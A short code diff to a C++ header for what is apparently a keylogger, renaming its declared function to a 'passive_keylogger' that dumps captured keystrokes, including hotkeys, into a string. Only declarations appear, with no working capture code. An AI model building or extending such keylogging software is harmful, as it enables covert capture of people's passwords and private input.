@@ -5,9 +5,10 @@
  * and Russian, also records all hotkeys
 */
 
+#include <string>
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
-int keylogger(std::string keylog_path);
+void passive_keylogger(std::string& dump, bool& close);
 
 #endif // KEYLOGGER_H
